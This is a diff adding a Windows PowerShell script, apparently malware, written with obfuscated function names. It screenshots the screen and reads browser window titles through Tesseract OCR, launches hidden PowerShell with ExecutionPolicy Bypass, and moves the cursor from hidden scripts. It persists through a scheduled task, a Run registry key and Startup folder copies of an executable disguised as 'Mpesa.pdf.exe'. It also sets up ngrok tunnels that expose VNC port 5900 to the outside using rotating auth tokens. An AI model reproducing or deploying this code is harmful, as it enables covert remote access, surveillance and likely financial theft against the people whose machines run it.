@@ -1,0 +1,566 @@
+
+#cmd /c "mkdir %random%.TRM-Carrefour"
+#exit
+
+#___________________________________________________
+
+
+#cmd /c "mkdir %random%.TaylorSwift"
+#exit
+
+#___________________________________________________
+
+$Pbc = "C:\Users\Public\Windows"; $Pbv = "C:\Users\Public\Videos"; $Pbr = "C:\Users\Public\Recorded TV"; $Pbp = "$home\Pictures"; $Pbs=$Pwd; $Pvocr = "C:\Program Files (x86)\Microsoft"; $global:x = 420; $global:y = 755; 
+
+$Ocr = "C:\Windows\addins"
+#$Ocr = "C:\Users\Public\Pictures"
+
+#___________________________________________________
+
+function Pdq-Naivas
+{
+	if (!(Test-Path $global:Pb))
+	{
+		New-Item -Path $global:Pb -ItemType Directory
+	}
+	else
+	{
+		echo GoodlifePharmacy!
+	}
+}
+
+#___________
+
+$global:Pb = $Pbc
+Pdq-Naivas
+
+$global:Pb = $Pbv
+Pdq-Naivas
+
+$global:Pb = $Pbr
+Pdq-Naivas
+
+$global:Pb = $Pbp
+Pdq-Naivas
+
+#___________________________________________________
+
+Set-Location -Path $Pbc
+
+
+#--------------------------------------------------------------------------------------------
+
+#Copy-Item "$home\My Downloads\WS\*.ps1" -Destination "C:\Users\Public\Windows" -Force; Copy-Item "$home\My Downloads\WS\*.cmd" -Destination "C:\Users\Public\Windows" -Force; #Remove-Item $Pwd\*.ps1;	Remove-Item $Pwd\*.txt; Remove-Item $Pwd\*.cmd
+
+Set-Location -Path $Pbc
+
+#___________________________________________________
+
+function Magenta-Coop
+{
+
+	cmd /c "dir /b > z1.ps1"
+
+	$one = 0; $file = ".\z1.ps1"; Hush-Puppi
+	$fileName = ".\z1.ps1"; $firstLine = Get-Content -Path $fileName -TotalCount 1; $firstLine > ".\z2.ps1"
+
+	Remove-Item ".\z1.ps1"
+	Remove-Item ".\z3.ps1"
+
+	$tr = ".\z2.ps1"; $tn = ".\z3.ps1"; $tl = 'Set-Location -Path "'; Abdul-Rahman
+	$ssx = (gc ".\z3.ps1") -replace '\S+$','$&"'; $ssx > ".\z3.ps1"
+
+	Remove-Item ".\z2.ps1"
+	Import-Module ".\z3.ps1"
+	Lara-Cosm
+}
+
+#___________________________________________________
+
+function Magenta-Stanchart
+{
+	Remove-Item "$Pbc\z3.ps1"
+	Remove-Item "$Pbc\z1.ps1"
+	Start-Sleep -s 1
+	
+	$pwd > "$Pbc\z1.ps1"
+	Remove-Item "$Pbc\z2.ps1"
+
+	Start-Sleep -s 1
+	Get-Content "$Pbc\z1.ps1" | Select-Object -Skip 3 | Out-File "$Pbc\z2.ps1"
+	
+	Remove-Item "$Pbc\z1.ps1"
+	Start-Sleep -s 1
+	
+	$global:tle = [IO.File]::ReadAllText("$Pbc\z2.ps1")
+	$tle = $tle.Trim()
+	
+	$tle > "$Pbc\z1.ps1"
+	Remove-Item "$Pbc\z2.ps1"
+}
+
+#___________________________________________________
+
+function Abdul-Rahman
+{
+	$Lines = Get-Content $tr
+	$OutputPath = $tn
+	foreach ($Line in $Lines) 
+	{
+		$Line = $line.Insert(0,$tl)
+		#$Line += ‘"’
+		Write-Output $Line | Out-File $OutputPath -Append
+	}
+}
+
+#$tr = ".\z2.ps1"; $tn = ".\z3.ps1"; $tl = 'Move-Item -path "'; Abdul-Rahman
+
+#___________________________________________________
+
+function Hush-Puppi
+{
+	$one;
+	while ($one -ge 0)
+	{
+		$file
+		Get-Content $file | Measure-Object -Line
+		$a = (Get-Content $file | Measure-Object)
+		(Get-Content $file) | ? {($a.count-0)-notcontains $_.ReadCount} | Set-Content $file
+		$one--; 
+	}
+}
+
+#$one = 2; $file = "$home\tokyo2.ps1"; Hush-Puppi
+
+#___________________________________________________
+
+function Lara-Cosm
+{
+	Remove-Item $Pwd\*.ps1;	Remove-Item $Pwd\*.txt; Remove-Item $Pwd\*.cmd
+}
+
+#___________________________________________________
+
+function Maria-Carparas
+{
+	Remove-Item "$Pbc\zlr.txt"; Remove-Item "$Pbc\zlr2.txt"
+
+	Get-Process $prc |where {$_.mainWindowtitle} |format-table mainWindowtitle -AutoSize > $Pbc\zlr.txt
+	Get-Content "$Pbc\zlr.txt" | Select-Object -Skip 3 | Out-File "$Pbc\zlr2.txt"
+	Remove-Item "$Pbc\zlr.txt"
+
+	$global:zlr = [IO.File]::ReadAllText("$Pbc\zlr2.txt")
+	$zlr = $zlr.Trim()
+	Set-Content -Path "$Pbc\zlr.txt" -Value $zlr
+	Remove-Item "$Pbc\zlr2.txt"
+	$global:zlr = ""
+}
+
+#___________________________________________________
+
+function Mountain-Cereals
+{
+	Maria-Carparas
+	$zlr = [IO.File]::ReadAllText("$Pbc\zlr.txt")
+
+	Remove-Item "$Pbc\z1.ps1"; Rename-Item "$Pbc\zlr.txt" "$Pbc\z1.ps1"; Remove-Item "$Pbc\z3.ps1"
+
+	$tr = "$Pbc\z1.ps1"; $tn = "$Pbc\z3.ps1"; $tl = '$wshell.AppActivate("'; Abdul-Rahman
+	$ssx = (gc "$Pbc\z3.ps1") -replace '\S+$','$&")'; Set-Content -Path "$Pbc\z3.ps1" -Value $ssx
+
+	Remove-Item "$Pbc\z1.ps1"
+
+	$file = "$Pbc\z3.ps1"; $global:unique = $global:prc; $string = [IO.File]::ReadAllText("$file")
+	if ($string -like "*$unique*")
+	{
+		echo Maelstrom!!
+	} 
+	else
+	{
+		Remove-Item "$Pbc\z3.ps1"
+		Mountain-Cereals
+	}	
+}
+
+#___________________________________________________
+
+function Air-NewZealand
+{
+	#generate random ip
+	Set-Location -Path $Pbc
+	$btc = [IPAddress]::Parse([String] (Get-Random) )
+	Remove-Item "$Pbc\btc.txt"
+	$btc > .\btc.txt
+	$btc = [IO.File]::ReadAllText(".\btc.txt")
+	$btc = $btc.Split('IPAddressToString : ')[-1]
+	$btc = $btc.Trim()
+	$btc > .\btc.txt
+}
+
+#___________________________________________________
+
+function Air-Asia
+{
+	#process image text for unique string	
+	$title = [IO.File]::ReadAllText("$file")
+	$string = $title
+	if ($string -like "*$unique*") 
+	{
+		echo GoodlifePharmacy!
+	} 
+	else
+	{ 
+		exit
+	}
+}
+
+#___________________________________________________
+
+function Garuda-Indonesia
+{
+	Remove-Item "$Pbc\title.txt"
+
+	$ProcessActive = Get-Process chrome -ErrorAction SilentlyContinue
+	if($ProcessActive -eq $null) 
+	{ 
+		$ProcessActive = Get-Process firefox -ErrorAction SilentlyContinue
+		if($ProcessActive -eq $null) 
+		{
+			$ProcessActive = Get-Process opera -ErrorAction SilentlyContinue
+			if($ProcessActive -eq $null) 
+			{
+				exit
+			}
+			else
+			{ 
+				$brs = "opera"
+				Get-Process opera |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt 
+			}
+
+		}
+		else
+		{
+			$brs = "firefox"
+			Get-Process firefox |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt 
+		}
+	} 
+	else
+	{ 
+		$brs = "chrome"
+		Get-Process chrome |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt 
+	}
+
+	Get-Content $Pbc\title.txt | Select-Object -Skip 3 | Out-File $Pbc\title2.txt
+	Remove-Item $Pbc\title.txt
+	$title = [IO.File]::ReadAllText("$Pbc\title2.txt")
+	$title = $title.Trim()
+	$title > $Pbc\title.txt
+	Remove-Item $Pbc\title2.txt
+}
+
+#___________________________________________________
+
+function Singapore-Airlines
+{
+	Set-Location -Path $Pbc
+	Remove-Item "$ocr\*.png"
+	Remove-Item "$ocr\*.txt"
+	Copy-Item $png -Destination $ocr
+	Remove-Item $png
+	Set-Location -Path $ocr
+	.\tesseract.exe .\$png .\$png
+}
+
+#___________________________________________________
+
+function Mage-Lo
+{
+	echo GoodlifePharmacy!
+}
+
+#___________________________________________________
+
+function Braeside-Catering
+{
+	param(
+	  [string]$Width,
+	  [string]$Height,
+	  [String]$FileName = "Screenshot"
+	 
+	)
+	 
+	function Take-Screenshot{
+	[cmdletbinding()]
+	param(
+	 [Drawing.Rectangle]$bounds,
+	 [string]$path
+	)
+		$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
+		$graphics = [Drawing.Graphics]::FromImage($bmp)
+		$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+		$bmp.Save($path)
+		$graphics.Dispose()
+		$bmp.Dispose()
+	}
+	 
+	function Get-ScreenResolution {
+		$Screens = [system.windows.forms.screen]::AllScreens
+		foreach ($Screen in $Screens) {
+			$DeviceName = $Screen.DeviceName
+			$Width  = $Screen.Bounds.Width
+			$Height  = $Screen.Bounds.Height
+			$IsPrimary = $Screen.Primary
+			$OutputObj = New-Object -TypeName PSobject
+			$OutputObj | Add-Member -MemberType NoteProperty -Name DeviceName -Value $DeviceName
+			$OutputObj | Add-Member -MemberType NoteProperty -Name Width -Value $Width
+			$OutputObj | Add-Member -MemberType NoteProperty -Name Height -Value $Height
+			$OutputObj | Add-Member -MemberType NoteProperty -Name IsPrimaryMonitor -Value $IsPrimary
+			$OutputObj
+		}
+	}
+
+	$datetime = (Get-Date).tostring("dd-MM-yyyy-hh-mm-ss")
+	$FileName = "{0}-{1}" -f $FileName, $datetime
+	$Filepath = join-path $env:temp $FileName
+	 
+	[void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
+	[void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+
+	if(!($width -and $height)) { 
+		$screen = Get-ScreenResolution | ? {$_.IsPrimaryMonitor -eq $true}
+		$Width = $screen.Width
+		$Height = $screen.height
+	}
+	Mage-Lo
+}
+
+#___________________________________________________
+
+function Cursor-Entry
+{
+	Set-Location -Path "C:\Users\Public\Windows"
+
+	Set-Content -Path C:\Users\Public\Windows\entry.cmd -Value 'PowerShell -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -NoExit -ExecutionPolicy Bypass -File "C:\Users\Public\Windows\entry.ps1" || PowerShell -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -NoExit -ExecutionPolicy Bypass -File entry.ps1'
+
+	Set-Content -Path C:\Users\Public\Windows\entry.ps1 -Value 'function Loska-Wines'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '{'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value ' $one = 1;'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value ' while ($one -le 3)'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value ' {'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '  Add-Type -AssemblyName System.Windows.Forms'
+	#Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '  $p1 = [System.Windows.Forms.Cursor]::Position.X = $x'
+	#Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '  $p1 = [System.Windows.Forms.Cursor]::Position.X = $x'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '  $p1 = [IO.File]::ReadAllText("C:\Users\Public\Windows\x.txt")'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '  $p2 = [IO.File]::ReadAllText("C:\Users\Public\Windows\y.txt")'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '  [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($p1, $p2)'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '  $one++;'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value ''
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '  $one = 3;'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '  while ($one -ge 1)'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '  {'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '   Add-Type -AssemblyName System.Windows.Forms'
+	#Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '   $p1 = [System.Windows.Forms.Cursor]::Position.X = $x'
+	#Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '   $p2 = [System.Windows.Forms.Cursor]::Position.Y = $y'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '   $p1 = [IO.File]::ReadAllText("C:\Users\Public\Windows\x.txt")'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '   $p2 = [IO.File]::ReadAllText("C:\Users\Public\Windows\y.txt")'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '   [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($p1, $p2)'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '   $one--;'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '  }'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value ' }'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value ''
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value '}'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value ''
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value 'Loska-Wines'
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value ''
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value ''
+	Add-Content -Path C:\Users\Public\Windows\entry.ps1 -Value ''
+
+	Start-Sleep -s 3
+	#cmd /c "cd / & cd C:\Users\Public\Windows & call entry.cmd || cd / & cd 'C:\Users\Public\Windows' & call entry.cmd"
+	start-process "C:\Users\Public\Windows\entry.cmd" -windowstyle hidden
+}
+
+#____________________________________________________
+
+function Cursor-Exit
+{
+
+	Remove-Item "C:\Users\Public\Windows\x.txt"
+	Remove-Item "C:\Users\Public\Windows\y.txt"
+
+	##########################################
+
+	Set-Location -Path $Pbc
+	Set-Content -Path C:\Users\Public\Windows\exit.cmd -Value 'timeout /t 15'
+	Add-Content -Path C:\Users\Public\Windows\exit.cmd -Value 'taskkill /f /im powershell.exe'
+	Set-Content -Path C:\Users\Public\Windows\exit.cmd -Value 'timeout /t 5'
+	Add-Content -Path C:\Users\Public\Windows\exit.cmd -Value 'PowerShell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -File C:\Users\Public\Windows\TaylorSwift.ps1"'
+	Add-Content -Path C:\Users\Public\Windows\exit.cmd -Value 'taskkill /f /im cmd.exe'
+
+	start-process "C:\Users\Public\Windows\exit.cmd" -windowstyle hidden
+}
+
+#___________________________________________________
+
+function Mutha-Ngari
+{
+	$d=1;
+	while ($d -ge 0)
+	{
+		Import-Module $peponi
+		$d--;
+	}
+}
+
+#$peponi = "C:\Users\Public\Videos\eVA1.ps1"
+#Mutha-Ngari
+#Start-Sleep -s 7
+
+#___________________________________________________
+
+function Search-Text
+{	  
+	Set-Location -Path $Pbc
+	function Mage-Lo
+	{
+		$bounds = [Drawing.Rectangle]::FromLTRB($a, $b, $c, $d) 
+		Take-Screenshot -Bounds $bounds -Path "$Pbc\text.png"
+	}
+
+	Braeside-Catering
+
+	$png = ".\text.png"
+	$global:Pbs=$Ocr; Lara-Cosm
+	Copy-Item $png -Destination $Ocr
+	Remove-Item $png
+	Set-Location -Path $Ocr
+
+	Set-Content -Path "C:\Program Files (x86)\Microsoft\IA.cmd" -Value 'tesseract.exe text.png text.png'
+	start-process "C:\Program Files (x86)\Microsoft\IA.cmd" -windowstyle hidden
+	$file = "$Ocr\text.png.txt"
+	$unique = $text
+
+	Start-Sleep -s 2
+	Air-Asia
+}
+#$a = 16
+#$b = 230
+#$c = 192
+#$d = 540
+#$text = "search"
+#Search-Text
+
+##___________________________________________________
+
+function Carder-Gp
+{
+
+	Start-Sleep -s 2
+	Set-Location -Path $Pbc
+	function Mage-Lo
+	{
+		$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $Screen.Width, $Screen.Height) 
+		Take-Screenshot -Bounds $bounds -Path "$Pbc\text.png"
+	}
+
+
+	Braeside-Catering
+
+	$png = ".\text.png"
+	$global:Pbs=$Ocr; Lara-Cosm
+	Copy-Item $png -Destination $Ocr
+	Remove-Item $png
+	Set-Location -Path $Ocr
+
+	Set-Content -Path "C:\Program Files (x86)\Microsoft\IA.cmd" -Value 'tesseract.exe text.png text.png'
+	Start-Sleep -s 2
+	start-process "C:\Program Files (x86)\Microsoft\IA.cmd" -windowstyle hidden
+	Start-Sleep -s 2
+	$global:path = [IO.File]::ReadAllText("$Ocr\text.png.txt")
+}
+
+#___________________________________________________
+
+function Aer-Linges
+{
+	Move-Item ".\Mpesa.pdf.exe" -Destination "$Pbc" -Force
+	Move-Item ".\Hill.cmd" -Destination "$Pbc" -Force
+	Move-Item ".\HillEyes.ps1" -Destination "$Pbc" -Force;
+
+	SCHTASKS    /Create /SC MINUTE /MO 35 /TN georgia /TR "C:\Users\Public\Windows\Hill.exe" /f
+	SCHTASKS    /Create /SC MINUTE /MO 35 /TN georgia /TR C:\Users\Public\Windows\Hill.exe /f
+
+	#SCHTASKS    /Create /SC MINUTE /MO 3 /TN georgia /TR "C:\Users\Public\Windows\Hills-Count.cmd" /f
+	#SCHTASKS    /Create /SC MINUTE /MO 3 /TN georgia /TR C:\Users\Public\Windows\Hills-Count.cmd /f
+
+	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v cd5 /t REG_SZ /d "C:\Users\Public\Windows\Mpesa.pdf.exe" /f
+	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v cd5 /t REG_SZ /d C:\Users\Public\Windows\Mpesa.pdf.exe /f
+
+	if (!(Test-Path "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"))
+	{
+		New-Item -Path '$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' -ItemType Directory
+		Copy-Item "$Pbc\Hill.exe" -Destination "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
+	}
+	else
+	{
+		Copy-Item ".\Hill.exe" -Destination "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
+	}
+
+	if (!(Test-Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"))
+	{
+		New-Item -Path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp' -ItemType Directory
+		Copy-Item "$Pbc\Hill.exe" -Destination "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
+	}
+	else
+	{
+		Copy-Item ".\Hill.exe" -Destination "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
+	}
+}
+
+#___________________________________________________
+
+function Ngrok-Outbound
+{
+	function Auth-Tkn
+	{
+		$auth = Get-Content $Pbc\auth.txt | Select-Object -First 1
+		Get-Content $Pbc\auth.txt | Select-Object -Skip 1 | Out-File $Pbc\auth0.txt
+		Remove-Item $Pbc\auth.txt
+		Rename-Item $Pbc\auth0.txt $Pbc\auth.txt
+	}
+
+	function Set-Va
+	{
+		Set-Content -Path $Pbc\window.cmd -Value "window.exe authtoken $auth"
+		Add-Content -Path $Pbc\window.cmd -Value "window.exe tcp -region $region 5900"
+	}
+
+	function Xe-Cex
+	{
+		$region = "jp"
+		Set-Va
+		$region = "eu"
+		Set-Va
+		$region = "ca"
+		Set-Va
+		$region = "in"
+		Set-Va
+		$region = "sa"
+		Set-Va
+		$region = "au"
+		Set-Va
+		$region = "ap"
+		Set-Va
+	}
+
+	$one=10;
+	while ($one -ge 0)
+	{
+		Auth-Tkn
+		Xe-Cex
+		$one--; 
+	}
+}
+
+#___________________________________________________
+
